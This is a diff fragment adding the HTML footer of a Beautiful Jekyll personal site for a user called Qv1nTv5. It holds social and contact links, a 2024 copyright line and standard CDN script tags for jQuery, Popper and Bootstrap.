+    <a href="mailto:sanmillan.german@gmail.com" title="Email me">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Email me</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://github.com/Qv1nTv5" title="GitHub">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">GitHub</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://twitter.com/Qvintvs1" title="Twitter">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-twitter fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">Twitter</span>
+   </a>
+  </li><li class="list-inline-item">
+    <a href="https://linkedin.com/in/german-sanmillan-68b308229/" title="LinkedIn">
+      <span class="fa-stack fa-lg" aria-hidden="true">
+        <i class="fas fa-circle fa-stack-2x"></i>
+        <i class="fab fa-linkedin fa-stack-1x fa-inverse"></i>
+      </span>
+      <span class="sr-only">LinkedIn</span>
+   </a>
+  </li></ul>
+
+      
+      <p class="copyright text-muted">
+      
+        Qv1nTv5
+        &nbsp;&bull;&nbsp;
+      
+      2024
+
+      
+
+      
+      </p>
+      <p class="theme-by text-muted">
+        Powered by
+        <a href="https://beautifuljekyll.com">Beautiful Jekyll</a>
+      </p>
+      </div>
+    </div>
+  </div>
+</footer>
+
+
+  
+  
+    
+  <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha256-4+XzXVhsDmqanXGHaHvgh1gMQKX40OUvDEBTu8JcmNs=" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js" integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous"></script>
+
+
+  
+    
+  <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js" integrity="sha384-wfSDF2E50Y2D1uUdj0O3uMBJnjuUD4Ih7YwaYd1iqfktj0Uod8GCExl3Og8ifwB6" crossorigin="anonymous"></script>
+
+
+  
+
+
+
+  
+    <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+    
+      <script src="/assets/js/beautifuljekyll.js"></script>
+    
+  
+
+
+
+
+
+
+
+
+
+</body>
+</html>
